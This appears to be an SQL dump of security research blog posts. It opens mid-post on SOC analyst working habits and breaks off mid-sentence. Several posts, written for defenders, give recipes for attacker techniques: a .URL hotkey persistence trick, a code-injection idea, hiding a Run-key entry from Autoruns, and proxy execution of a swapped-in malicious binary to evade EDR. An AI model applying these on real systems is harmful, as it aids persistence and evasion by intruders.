beginning – explain what led you to ask the question… this often changes/affects the answer – speeds things up and makes you look awfully good!\n\n\nIf you use emails as a main source for your alerts, and send lots of emails:\n\nCreate .OFT email templates for all most-common scenarios\nReplying to tickets will be easy this way and many things can be auto-populated\nAgain, re-use and provide branding and consistency\n\n\nDid I mention branding?\n\nYOU ARE A PART THAT FORMS THE CERT BRAND in your org\nBe consistent\nBe predictable\nBe likable\nBe a consultant, not a guy who nags people\nBe aware that some users will come back and challenge you – explain why you contact them to avoid confrontations like this\nRemember you are a COST CENTRE not a PROFIT CENTRE\n\nSome ppl you contact will have bigger priorities than you\nThey more than often actually make money for the company\nThe money that pay for your salary\nTreat them with respect\nBut\nbe consistent and firm – escalate if needed\ndon’t be afraid of titles – an infection on CEO’s/SVP’s laptop is a serious biz no matter what they say; engage senior people directly or indirectly\neven admins, hardcore IT guys are absolute security idiots; educate them; explain; provide links to blogs; make them think\n\n\n\n\nComing back to my automation mantra – if you need to fill-in some data and this has to be saved in a template, write a small program/script, or even create a web page with a bit of JavaScript that will allow you to enter data in one place, and the script will create the output for you – if you don’t know what I mean, check the interface of 3RPG – the cheat is that you create your own form, that in turn gives you a desired, consistent output!\n\n\nFILLING-IN TICKETS\n\nThis is typically the worst part and while I repeat myself I want to say this:\n\nI had a good experience using macromakers (tools that record mouse/keyboard/UI actions that you can replay with one keyboard shortcut),\nBookmarklets (small pieces of JavaScript that you can run by clicking a bookmark; using browser debugger /F12 in most browsers/ will be handy here to write bookmarklets that work for you as you can use it to find form fields this way; form fields that you want to populate with a predefined set of values) – these tool can automate filling-in the tickets (e.g. if you have typically 5 different types of tickets, you can have 5 bookmarklets that will fill-in stuff for you and available under 5 shortcuts i.e. these, when clicked, will populate the most common fields that rarely change; all you need to do is a quick QA instead of clicking and selecting items from the lists for each time =  this can give you a lot of time saved)\nLet the automation (if available) do it for you as per template/bookmarklet – see next bullet point\n\n\nIf you are more advanced look at API the ticketing system uses; if you don’t know, identify some programmer in your company who can write a script for your to automate tickets processing (e.g. open/close); it’s not difficult (e.g. Archer supports SOAP and REST); external support from professional services (if available for your ticketing system) can also do a lot of magic\nIf you have _any_ influence, try to push for changes at the design level i.e. ticketing system can always be adapted to your needs (i.e. your company’s IR worklfow) or… replaced\nIf possible, provide feedback about bad experience, time-consuming tasks; talk to your manager; nag them – make it their problem – it’s actually their job to make your work easy\nEnrich data automatically, wherever possible (this is related to design/architecture of the ticketing system; you may not have the necessary influence, but can always chat with your peers/manager and compare your system to ‘other company’s’ system, where your buddy works and the system does miracles there)\n\n\nCLOSURES\n\nWalk through the ticket and ensure that everything is in order\n\nAll fields filled-in properly and accurately\nThere is a narrative; a non-technical person should be able to read and understand what happened, when, where, what was affected, what was the analysis, what was the outcome, what was done in the triage, analysis, containment, eradication, recovery steps\nAdd lessons learned (actually, probably don’t as no one reads it; better keep these on email)\nDo not add vague, unrelated comments\nDo not write to yourself or to a virtual audience (“I need a second opinion here”)\nLast, but not least – add clear conclusion “Analysis shows that there is NO malware on the system”. Only now you can close\n\n\nAlternative to closing ticket, use a hold/pending other teams status if you have one – this puts the weight of long closing times on your dependencies (i.e. other teams)\n\n\n\n\n\n\n‘STUPID MANAGERS’\n\nFACTS\n\nThey exist, sorry \n\n\nHOW TO CHEAT:\n\nTry to understand what their game is:\n\nAre they truly concerned about the output of your work, just metrics, or they are psychopaths that simply enjoy their power trips?\nIf they do power trip thing, change the company; you won’t win with them; not worth your time\nIf they are not, again, try to understand what their game really is\nFundamentally, are they good mentors to you? i.e. do you want to be like them?\nManagers are your bridge to the leadership\n\nCommunicate with them all the issues you come across\n\nPoint out difficult things\nPraise the good stuff too!\n\n\nIf no documentation exist, start creating one; who knows, maybe you will own this as a project (good bye all the days related to ticketing)\nAsk for space to learn e.g. project day, certificates, courses, team meetings with demoes\n\n\n\n\n… Mentor them back and delegate upstream;\n\nYes… instead of waiting for things to happen, make them happen by making your managers making them happen\nLet them know of your issues, make them make decisions; or in other words, bring things to their attention so it is their problem, not yours – and ask them to formalize it!\nThis last sentence should really guide you through your L1 experience overall\n\nYou are here to deliver a consistent, repetitive task\nAnything outside of it should be brought to your manager for evaluation and result in either a change in a process (e.g. additional branch on a decision tree), your manager being fired (just kidding), or the whole thing being dropped (stop seeing alerts of certain types, auto-closing, tuning of alerts, etc.)\n\n\n\n\nDon’t whine; avoid it like a plague;\n\nUnless you both whine about the same thing  I hate one or two security products but I didn’t make a call to bring it to the company, so have to use it, no matter what I think of it; I seriously hope I can write about these on my blog one day…\nThink of what capabilities your manager has to fix your problems\n\nYou may often realize that they, same as you, are pretty limited in their own world\nWhen you realize they bang their head against the wall same as you, you may actually change your opinion about their management style\nWhen you understand their game, help them\nWhen you help them, they will recognize your efforts (unless they are @#%^&)\n\n\nAlso, if you whine, think of\n\nsolutions\nacceptance of the current status quo\n\n\nOnce you provide solutions (even if just suggestions) you will be perceived as a solution ‘man’, not an @#%^& who is just flagging problems\nOnce you accept the status quo – you can chill out \n\n\nOwn things\n\nIt’s VERY okay if you don’t understand things, or make mistakes\nWhen you own it, you will be seen as reliable\nIt’s better to have a reliable guy who delivers, even making lots of mistakes at first than someone who doesn’t care and just floats on the surface!!!\n\nI can tell you I did both and I was always better off delivering what’s expected! \n\n\n\n\nDon’t bring your BIG ideas to the analysis YET (in your first months)\n\nIt’s not your role\nBut collect these ideas and evaluate them over some period of time (say… 6 months?); talk about these ideas informally with your peers/L2/manager; bring them in as suggestions not ‘we must do it, because it’s my opinion’\nIn any case you need to do analysis as per the guidance provided by the more senior people first; and you need to do it right first; no one will perceive you seriously until you are a reliable L1 analyst\nAnd… then you will be able to bring ideas to the table (i.e. again _after_ you do what they tell you properly first, then establish yourself; in any case, you can’t improve the process you don’t understand/follow + you are 100% not aware of many past decisions, so your opinion is very biased!)\n\n\nDon’t call things ‘stupid’ YET\n\nYou actually have to earn that right.\nIt’s only when you fully understand the process given to you when you can call it ‘stupid’ or ‘inefficient’\nAgain, remember that things that are part of the process are imperfect for many reasons, some of them you won’t know, even your manager won’t know (!!!) – they are there, because someone, some time in the past decided they should be there; look for reasons for their existence, don’t scrutinize it yet\n\n\nDon’t change any process on your own\n\nYou will surely break things (some ppl will complain)\n\n\n\n\n\n\nALERT MAILBOX MANAGEMENT\n\nUse ticketing system that removes emails from the equation (this is the future)\nIf you can’t, use (or make your request known to your manager) consistent subject lines that allow for setting up Outlook rules (I don’t mention other email software in this post, because corporate=typically outlook, but if you use different systems just adapt to your needs)\nIf you see alerts you DO NOT react to – and they keep coming, ask your manager to kill them at source, or set up outlook rule to redirect them to a folder where they will be stored and marked as automatically read\nIf you use Outlook rules, adapt them and review them every once in a while and especially when you see new patterns – technology changes, we often don’t even get notification when it happens and rules may stop working\nIf possible, push away NON-incident emails; I personally classify incidents as anything that affects Confidentiality, Integrity, or Availability and in my mind the C & I should be handled by respective CERT/Privacy teams (or together), and A either by NOC, or webops, or anyone that manages the infrastructure; CERT/SOC ppl often don’t see (or don’t understand) the architecture and can’t participate in handling DDoS very well; for some reason many companies burden CERT/SOC with this task… In my books.. Availability issues should be documented by CERT/SOC in a way a security guard observes and reports… and let the infrastructure guys do the needful (working with network teams, Anti-DDoS vendors, etc.)\nProvide feedback from your research to threat hunting teams; if you see the same executable hit by AV, EDR, or Splunk rule – and you know 100% it’s an FP – exclude it, or flag it as such to these teams! Actively participate in tuning the feed that comes to the alert mailbox\n\n\nTL; DR; takeaways, and making it a GAME WITH A PURPOSE\n\nLearn programming (automation, API), scripting (bookmarklets), writing macros\nLearn your software (shortcuts, functions)\nTry to research log formats, protocols, how browser works, how network works, how computer works, how OS works, how malware works\nTreat others with respect and assume advisory role when dealing with users\nUse templates, boilerplates\nShow interest and initiative\nCommunicate, communicate, communicate\n\n\n\nAnd… don’t follow all this advice unless you are convinced this is a good advice. Also, note that while I may be advising you here I often have my ups and downs, and totally whine more often than I should….\nBUT\nThen I kinda man up and own the status quo and suddenly things are easier. So… last, but not least… recognize your whining times and use them to collect ideas on how to fix stuff a.k.a make your own life easier.\nTickets are just this – the spit in your face you need to learn to wipe off quickly, humbly, and… faster and faster. The better you are at it, the faster the time flows, the more you learn, and … you have more time to learn the next-big thing.\nIf you have any tricks of the trade you would like to add, or expand on please let me know and I will update the post. Thx!\nShare this :)', 'How to..., SOC', 'http://www.hexacorn.com/blog/2018/02/25/how-to-become-the-best-soc-analyst-e-v-e-r/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (46, 'Permanent Link to Beyond good ol’ Run key, Part 72', 'Hexacorn', 'February 9, 2018 ', 'In my old post I described a simple trick that shows how to set up a hot key that can be assigned to execute shortcuts (.LNK files) placed on a Desktop or in a Start Menu. This action survives reboots and logon/logoffs so it’s a nice, and somehow accidental persistence mechanism.\nTurns out there is one more variant of this trick that relies on using the .URL files.\nPlacing a .URL files containing the following data:\n[InternetShortcut]\r\nURL=file:///c:/windows/system32/calc.exe\r\nHotKey=768\non a Desktop will assign CTRL+SHIFT sequence to an action that will trigger the execution of the calculator.\nThe Hotkey can be assigned either manually (via properties):\n– in such case you won’t be able to assign the more trickier combinations like CTRL+SHIFT. Or we can do it manually, and in such case all the hotkey tricks are available. All you have to do is to assign a proper value to the HotKey parameter inside the .url file.\nYou can find out what values represent what codes or by experimenting… or… you can cheat and read this old guide: An Unofficial Guide to the URL File Format.\n \n \nShare this :)', 'Anti-*, Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident R', 'http://www.hexacorn.com/blog/2018/02/09/beyond-good-ol-run-key-part-72/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (47, 'Permanent Link to Endpoint Detection and Response (EDR) solutions sheet – update', 'Hexacorn', 'February 4, 2018 ', 'I recently mentioned how cool it is to collaborate with people online. You publish some stuff and others provide corrections and improvements. Others publish some stuff and sometimes you can give them some hints, or ideas.\nToday’s update is about collaboration too – Amos Yau kindly offered to update the IR_EndPointSolutions.xlsx file with some new information about:\n\nCountertack\nCrowdStrike\nMandiant/FireEye\nReaQta\n\nThank you Amos!\nThe latest EDR sheet can be found here.\nAs usual, if you find anything wrong/needing some amendment, please do let me know. I’ll fix it.\nShare this :)', 'EDR', 'http://www.hexacorn.com/blog/2018/02/04/endpoint-detection-and-response-edr-solutions-sheet-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (48, 'Permanent Link to PROPagate follow-up #2 – Some more Shattering Attack Potentials', 'Hexacorn', 'February 4, 2018 ', 'A few months back I discovered a new code injection technique that I named PROPagate. Using a subclass of a well-known shatter attack one can modify the callback function pointers inside other processes by using Windows APIs like SetProp, and potentially others. After pointing out a few ideas I put it on a back burner for a while, but I knew I will want to explore some more possibilities in the future.\nIn particular, I was curious what are the chances one could force the remote process to indirectly call the ‘prohibited’ functions like SetWindowLong, SetClassLong (or their newer alternatives SetWindowLongPtr and SetClassLongPtr), but with the arguments that we control (i.e. from a remote process). These API are ‘prohibited’ because they can only be called in a context of a process that owns them, so we can’t directly call them and target windows that belong to other processes.\nIt turns out his may be possible!\nIf there is one common way of using the SetWindowLong API it is to set up pointers, and/or filling-in window-specific memory areas (allocated per window instance) with some values that are initialized immediately after the window is created. The same thing happens when the window is destroyed – during the latter these memory areas are usually freed and set to zeroes, and callbacks are discarded.\nThese two actions are associated with two very specific window messages:\n\n\nWM_NCCREATE\n\n\nWM_NCDESTROY\n\n\nIn fact, many ‘native’ windows kick off their existence by setting some callbacks in their message handling routines during processing of these two messages.\nWith that in mind, I started looking at existing processes and got some interesting findings. Here is a snippet of a routine I found inside Windows Explorer that could be potentially abused by a remote process:\nOr, it’s disassembly equivalent (in response to WM_NCCREATE message):\n\nSo… since we can still freely send messages between windows it would seem that there is a lot of things that can be done here. One could send a specially crafted WM_NCCREATE message to a window that owns this routine and achieve a controlled code execution inside another process (the lParam needs to pass the checks and include pointer to memory area that includes a callback that will be executed afterwards – this callback could point to malicious code). I may be of course wrong, but need to explore it further when I find more time.\nThe other interesting thing I noticed is that some existing windows procedures are already written in a way that makes it harder to exploit this issue. They check if the window-specific data was set, and only if it was NOT they allow to call the SetWindowLong function. That is, they avoid executing the same initialization code twice.\nShare this :)', 'Anti-*, Code Injection, Compromise Detection, EDR, Incident Response, Malware Analysis', 'http://www.hexacorn.com/blog/2018/02/04/propagate-follow-up-2-some-more-shattering-attack-potentials/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (49, 'Permanent Link to Beyond good ol’ Run key, Part 71', 'Hexacorn', 'January 28, 2018 ', 'Today I will describe a persistence mechanism that doesn’t seem to work. The reason why I still include it is because it may save you some time if you come across this registry key and want to research it. It may also trigger some research that will make it work, so who knows… Perhaps still worth monitoring changes to the registry key described below.\nThe alg.exe process is used in conjunction with other services to deliver Application Layer Gateway mechanism to Windows OS. The wikipedia describes what it does in detail, so I’ll focus only on so-called Application Layer Gateway (ALG) Plugins.\nI am not the first to stumble upon this – there is a programmer who in 2009 tried to develop one such plug-in but couldn’t make it work.\nSo… here’s the theory.\nThe alg.exe process is a service process. On Windows XP the ALG service is launched when you e.g. enable Windows Firewall.\nAnytime it runs it is supposed to load the ALG plugins and keep an eye (monitors change via notification) on the following registry key:\n\nHKLM\\SOFTWARE\\Microsoft\\ALG\\ISV\n\nAny changes to this node will force the alg.exe process to re-load ALG Plug-ins.\nThe only plug-in that is present in a standard installation of Windows is {6E590D61-F6BC-4dad-AC21-7DC40D304059} that handles the ‘FTP Client/Server Protocol’. Numerous posts online talk about modifying this key properties to enable passive FTP protocol and troubleshoot FTP protocol issues in general.\nThat’s the theory.\nAfter discovering this mechanism I of course tried to develop my own plugin and force it to load, but was unsuccessful. I then found the aforementioned post from 2009 and decided to publish my findings.\nI kinda know what it doesn’t work. Despite being able to force the alg.exe to enumerate the HKLM\\SOFTWARE\\Microsoft\\ALG\\ISV key nothing happened (what should happen is the COM instantiation).\n\nLooking briefly at the code related to plug-in refresh I noticed there seem to be a lot of check if the loaded plugin is actually the default ‘FTP Client/Server Protocol’ plug-in. It’s possible it is the only plug-in that can be loaded as is… whitelisted via hardcoded checks.\nI guess it’s one of these projects that one has to put on a back burner…\nShare this :)', 'Anti-*, Anti-Forensics, Archaeology, Autostart (Persistence), Forensic Analysis, Incident Response, ', 'http://www.hexacorn.com/blog/2018/01/28/beyond-good-ol-run-key-part-71/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (50, 'Permanent Link to aitstatic.exe – Application Impact Telemetry Static Analyzer – brief analysis wann', 'Hexacorn', 'January 28, 2018 ', 'I was browsing the Windows 10 system32 directory and this executable caught my eyes. I never looked at it before and the information on the internet was scarce. After checking its version information I learned that it’s supposed to be ‘Application Impact Telemetry Static Analyzer’. There is a thread on the Microsoft site that summarizes all the information about this program quite well (nothing is known :)), but the last entry at the time I read it says this (edited to remove some obvious typos):\nThe Microsoft Application Impact Telemetry Agent is installed with Windows and runs as a scheduled task when Windows boots. Application Impact Telemetry Agent is designed to collect various system information and report to Microsoft as part of Windows Customer Experience Improvement Program (CEIP). CEIP collects information about how our customers use Microsoft programs and about some of the problems they encounter.\nBasically a spyware, collects information from your computer and sends it to the NSA servers Microsoft servers.\nStill not much wiser I decided to poke around a bit more. I discovered that it takes a number of various arguments that I don’t fully understand, but for these I figured out I decided to document.\nWho knows, maybe someone will find it useful.\nSo…\n\n-arp — no idea\n-dir <directory> — scans directory and retrieves telemetry for files present in the directory\n-dn – no idea\n-dnf – no idea\n-dro — no idea\n-e — enables logging the errors to the screen; it’s helpful to enable it during searches\n-fid — file ID for which telemetry is retrieved (see below)\n-fp — no idea\n-le — no idea\n-o — output file\n-op — no idea\n-pfn — no idea\n-ph — no idea\n-pid — program PID for which telemetry is retrieved (see below)\n-ui — no idea\n-wrt — no idea\n\nThe syntax is a bit quirky, so it’s good to always include the ‘-e’ argument to enable output of the error messages.\nThe PID (–pid) is not a process ID (decimal or hexadecimal), but a 44-character long string. I was surprised at first, until I used Procmon and discovered that the program is reading ‘\\REGISTRY\\A\\’ hive which is a result of using RegLoadAppKey API function that in turn loads the local hives in a temporary folder that seem to be similar to the ‘Amcache.hve’ file. (update: I have updated the previous paragraph after some more testing – the ‘\\REGISTRY\\A\\’ is related to the locally create hive file, but not ‘Amcache.hve’, at least not directly)\nThe PID it expects is an identifier one can find under the Programs node:\n\nRoot\\Programs\\\n\nas shown using an excellent Registry Explorer from Eric R. Zimmerman’s toolkit:\nSo… one can run e.g. this:\n\naitstatic.exe -e -o pid_test -pid 00006f8ae7433257edc86c41e1350afdf5510000ffff\n\nand obtain an output file ‘pid_test’ that contains the following data:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<AitStaticAnalysis \r\n ProgramId=\"00006f8ae7433257edc86c41e1350afdf5510000ffff\" \r\n AnalysisVersion=\"1.60\" \r\n DictionaryVersion=\"3.1\" \r\n Type=\"Program\" \r\n Id=\"00006f8ae7433257edc86c41e1350afdf5510000ffff\"/>\nNot much. I tried to run it with other PIDs I spotted and eventually got a much larger file as a result of using the Total Commander’s program ID obtained from ‘Amcache.hve’.\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<AitStaticAnalysis \r\n ProgramId=\"0000ab4489404bbd3353a97823b213e6ab910000ffff\" \r\n AnalysisVersion=\"1.60\" \r\n DictionaryVersion=\"3.1\" \r\n Type=\"Program\" \r\n Id=\"0000ab4489404bbd3353a97823b213e6ab910000ffff\">\r\n<AitFile \r\n ErrorCode=\"0\" \r\n Name=\"TCMDLZMA.DLL\" \r\n Id=\"0000101c41574f37269984e55e89e49dcf0b0db2e695\">\r\n<AitCategory Id=\"ApiStatic\">\r\n<AitFeature Name=\"kernel32.dll!CloseHandle\"/>\r\n<AitFeature Name=\"kernel32.dll!CreateEventA\"/>\r\n<AitFeature Name=\"kernel32.dll!CreateSemaphoreA\"/>\r\n<AitFeature Name=\"kernel32.dll!CreateThread\"/>\r\n<AitFeature Name=\"kernel32.dll!DeleteCriticalSection\"/>\r\n<AitFeature Name=\"kernel32.dll!EnterCriticalSection\"/>\r\n<AitFeature Name=\"kernel32.dll!ExitProcess\"/>\r\n<AitFeature Name=\"kernel32.dll!ExitThread\"/>\r\n<AitFeature Name=\"kernel32.dll!FreeEnvironmentStringsA\"/>\r\n<AitFeature Name=\"kernel32.dll!FreeEnvironmentStringsW\"/>\r\n<AitFeature Name=\"kernel32.dll!GetACP\"/>\r\n<AitFeature Name=\"kernel32.dll!GetCPInfo\"/>\r\n<AitFeature Name=\"kernel32.dll!GetCommandLineA\"/>\r\n<AitFeature Name=\"kernel32.dll!GetCurrentProcess\"/>\r\n<AitFeature Name=\"kernel32.dll!GetCurrentThreadId\"/>\r\n...\r\n[...]\nThe file is pretty long and appears to contain:\n\nList of programs in Total Commander directory – focuses is on .exe and .dll\nEach binary is parsed to extract its static dependencies (imported functions)\nThe output file includes these dependencies in a fancy xml format\n\nSo, it’s a bit like running Dependency Walker on the whole directory and extracting the info about the files.\nAnother way to obtain the dependencies information is to use the ‘-dir’ parameter. It takes one argument which is a directory name we want to enumerate.\nRunning:\n\naitstatic.exe -e -o dir_test -dir .\n\nwill give us a similar listing and will include data from the current directory.\nThe FID parameter takes 2 44-character long identifiers that seem to be searched for inside the Root\\File branch, but I didn’t make it work in the end.\nAll in all, probably a bit of wasted time, but perhaps someone will find it useful.\nShare this :)', 'Forensic Analysis, Reversing', 'http://www.hexacorn.com/blog/2018/01/28/aitstatic-exe-application-impact-telemetry-static-analyzer-brief-analysis-wannabe-post/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (51, 'Permanent Link to DeXRAY 2.05 update', 'Hexacorn', 'January 26, 2018 ', 'If there is one proof that online collaboration works it is DeXRAY. Since the tool was first released it received quite a bit of attention from the DFIR community. Every once in a while I get not only a positive feedback from the users, but also very important contributing ideas and code offered by security researchers and professionals.\nThis release is not different.\nA few days ago I was pinged by Luis Rocha (@countuponsec) who generously offered his insight and results of his and Antonio Monaca’s research on Kaspersky’s System Watcher feature (available in KES10) that quarantines files in the following location:\n\nC:\\ProgramData\\Kaspersky Lab\\KES10\\SysWHist\\file_cache\\<md5>.bin\n\nLuis discovered that the files are encrypted with a static XOR key 397b4d58c9397b4d58c9.\nBased on his research I have quickly implemented a routine in Dexray to decrypt these files.\nThanks Luis and Antonio!\nYou can download the latest version here.\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nBullGuard (Q)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ, System Watcher’s <md5>.bin)\nLavasoft AdAware (BDQ) /BitDefender files really/\nLumension LEMSS (lqf)\nMalwareBytes Data files (DATA) – 2 versions\nMalwareBytes Quarantine files (QUAR) – 2 versions\nMcAfee Quarantine files (BUP) /full support for OLE format/\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nSymantec Quarantine files on MAC (quarantine.qtn)\nTrendMicro (Magic@0=A9 AC BD A7 which is a ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nZemana <hash> files+quarantine.db\nAny binary file (using X-RAY scanning)\n\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2018/01/26/dexray-2-05-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (52, 'Permanent Link to What can you do with 250K sandbox reports?', 'Hexacorn', 'January 20, 2018 ', 'I was recently asked about the data I released for the New Year celebration. The question was: okay, what can I do with all this alleged goodness?\nWell…\nFor starters, this is the first time (at least to my knowledge) someone dumped 250K reports of sandboxed samples. The reports are not perfect, but can help you to understand the execution flow for many malware (and in more general terms: software) samples.\nWhat does it mean in practice?\nLet’s have a look…\nSay you want to see all the possible driver names that these 250k include.\nWhy would you need that?\nThis could tell you what anti-analysis tricks malware samples use, what device names are used to fingerprint the OS. Perhaps some of these devices are not even documented yet!\ngrep -iE \\\\\\\\\\.\\\\ Sandbox_250k_logs_Happy_New_Year_2018\ngives you this:\nYou can play around with the output, but writing a perl/python script to extract these is probably a better idea.\nOkay, what about the most popular function resolved using the GetProcAddress API?\nSomething like this could help:\ngrep -iE API::GetProcAddress Sandbox_250k_logs_Happy_New_Year_2018 | \r\ncut -d: -f3 | cut -d, -f2 | cut -d= -f2 | cut -d) -f1\nThis will give you a list of all APIs:\n\nWe can save the result to a file by redirecting the output of that command to e.g. ‘gpa.txt’:\ngrep -iE API::GetProcAddress Sandbox_250k_logs_Happy_New_Year_2018 | \r\ncut -d: -f3 | cut -d, -f2 | cut -d= -f2 | cut -d) -f1 > gpa.txt\nThis will take a while.\nYou can now sort it:\nsort gpa.txt > gpa.txt.s\nThe resulting file gpa.txt.s can be then further analyzed – sorting by number of API occurrence, then sort the results in a descending order showing the most popular APIs:\ncat gpa.txt.s | uniq -c | sort -r | more\nAll the above commands could be combined into a one, single ‘caterpillar’, but using intermediate files is sometimes handy. It facilitates further searcher later on… It also speeds things up.\nComing back to our last query, we could inquire for all APIs that include ‘Reg’ prefix/infix/suffix – this can give us some rough idea of what popular Registry APIs are resolved the most frequently:\ncat gpa.txt.s | uniq -c | sort -r | grep -E \"Reg\" | more\nHow would you interpret the results?\nThere are some FPs there e.g. GetThemeBackgroundRegion, but it’s not a big deal. ANSI APIs (these with the ‘A’ at the end) are still more popular than the Unicode ones (more precisely, ‘Wide’ ones, with the ‘W’ at the end). Or, … the dataset we have at hand is biased towards older samples that were compiled w/o Unicode in mind. So… be careful… interpretation is very biased really.\nBut see? This is all an open book!\nAgain, want to emphasize that all the searches can be done in many ways.  It’s also possible you will find some flaws in my queries. It’s OK. This is a data for playing around!\nNow, imagine you want to see all the DELPHI APIs that we intercepted:\ngrep -iE Delphi:: Sandbox_250k_logs_Happy_New_Year_2018 | more\nor, all inline functions from Visual C++:\ngrep -iE VC:: Sandbox_250k_logs_Happy_New_Year_2018 | more\nor, all the rows with the ‘http://’ in it (highlighting possible URLs):\ngrep -iE http:// Sandbox_250k_logs_Happy_New_Year_2018 | more\nYou can also see what debug strings samples send:\ngrep -iE API::OutputDebugString Sandbox_250k_logs_Happy_New_Year_2018 | more\nYou can check what values are used by the Sleep functions:\ngrep -iE API::Sleep Sandbox_250k_logs_Happy_New_Year_2018 | more\nand Windows searched by Anti-AV/Anti-analysis tools:\ngrep -iE API::FindWindow Sandbox_250k_logs_Happy_New_Year_2018 | more\n\netc. etc.\nThe sky is the limit.\nYou can look at the beginning of the every single sample and identify the ‘dynamic’ flow of the WinMain procedure for many different compilers, discover various environment variables used by different samples, cluster APIs from specific libraries, observe techniques like process hollowing, observe the distribution of WriteProcessMemory to understand how many sample use a RunPE for code injection and execution, and how many rely on Position-independent-code (PIC), you can see what startup points are the most frequently used (it’s not always HKCU\\…\\Run!) , what mechanisms are used to launch code in a foreign/process (e.g. RtlCreateUserThread, APC functions), how many processes are suspended before code is injected to them (CREATE_SUSPENDED), etc. etc.\nAgain… this data can remain a dead data, or you can make it alive by being creative and mining it in any possible way…\nIf you have any questions feel free to DM me on Twiter, or ping me directly via email.\nNote: commercial use of this data is prohibited; I only mention it, because not only it’s most likely temping to abuse it, but you may be actually better off using a different data set. If you want to use it commercially I could provide you with 1.6M Unicode-based reports for analysis with more details included. Get in touch to find out more \nShare this :)', 'Batch Analysis, Clustering, Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2018/01/20/what-can-you-do-with-250k-sandbox-reports/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (53, 'Permanent Link to Yet another way to hide from Sysinternals’ tools, part 1.5', 'Hexacorn', 'January 19, 2018 ', 'This little trick can be used to prank your friend more than using it as a real nation-state pwning technique, but it’s worth documenting, as usual, so here it goes…\nI mentioned previously the Autoruns program registers the file type HKCR\\Autoruns.Logfile.1  / HKCR\\.ARN. The file stores the information autoruns grabbed from the system. You can save the autoruns log, and you can load them.\nThe last bit is the interesting part – if we can force the system to redirect all autoruns instances to one we can control, and also one that will always load the preserved data from the .arn file (instead of loading the fresh data set directly from the system), we will be able to fool the user that the state of the system has not changed.\nSo… the recipe goes like this:\n\nRemove HKCR\\Autoruns.Logfile.1 and HKCR\\.ARN registry entries\nSave autoruns.exe as e.g. c:\\test\\AutoNOruns.exe\nRun c:\\test\\AutoNOruns.exe\n\nThis will create new association for .ARN file in Registry (ones that point to c:\\test\\AutoNOruns.exe)\nThis will also enumerate all autoruns entries on the system\n\nSave these results to e.g. c:\\test\\AutoNOruns.arn\n\n\n\n\nModify registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\\nApp Paths\\autoruns.exe\nto point to\nc:\\test\\AutoNOruns.arn\nAdd some ‘bad’ entry to e.g. HKCU\\Run\nRun autoruns from the terminal, or via Windows+R\nThe new ‘bad’ entry won’t be shown.\n\nCaveats:\n\nIt takes observable time to load c:\\test\\AutoNOruns.arn\nRefreshing the view (F5) will unhide all the ‘hidden’ entries as Autoruns will refresh the view directly from the system\nDouble-clicking autoruns.exe is not routed via App Paths key so autoruns.exe will run properly\n\nSo, there you have it. The first Autoruns Rootkit ;)))\nIt’s superlame and has so many caveats that it’s impossible to treat it seriously, but maybe you will be able to fool someone \nShare this :)', 'Anti-*, Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Silly', 'http://www.hexacorn.com/blog/2018/01/19/yet-another-way-to-hide-from-sysinternals-tools-part-1-5/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (54, 'Permanent Link to Reusigned Binaries – Living off the signed land, Part 2', 'Hexacorn', 'January 5, 2018 ', 'Signed binaries can be used to do a lot of funny, unexpected stuff – today I will cover a simple proxy execution technique that can be used as a possible EDR evasion, and who knows, perhaps could throw some sandboxes off as well.\nFor a quick demo I chose Autoruns as a culprit, because it’s popular, but bear in mind that it can be any application really that registers its own file type in the Registry.\nSo…\nWhen you run the Autoruns program it will, apart from showing you the startup entries, register a file type .ARN:\nHKCR\\.ARN\nthat points to\nHKCR\\Autoruns.Logfile.1\nwhich tells the system how to open the file:\nHKCR\\Autoruns.Logfile.1\\shell\\open\\command=\r\n\r\n\"<PATH>\\Autoruns.exe\" \"%1\"\nSince the entry is created using a signed binary, one could drop autoruns on the system, and execute it (GUI is not such a big deal as it could be either partially, or fully hidden e.g. using ‘start /min’, launching on a different desktop, etc.).\nOne could now replace the autoruns in the path where it was executed from with the malicious autoruns.exe, create a dummy foo.arn file, and\n\nlaunch the foo.arn file – this will execute the payload\nadd the foo.arn file to e.g. Run key; since the file is non-malicious, it won’t trigger an alert from a typical AV; next time the user logs in, the dummy .arn file will be ‘opened’ i.e. launched via Explorer leading to malicious autoruns.exe being executed (Update: I recently learnt that Kovter is using similar trick since at least 2016)\n\nIt is really trivial, but as I explained in the first post in this 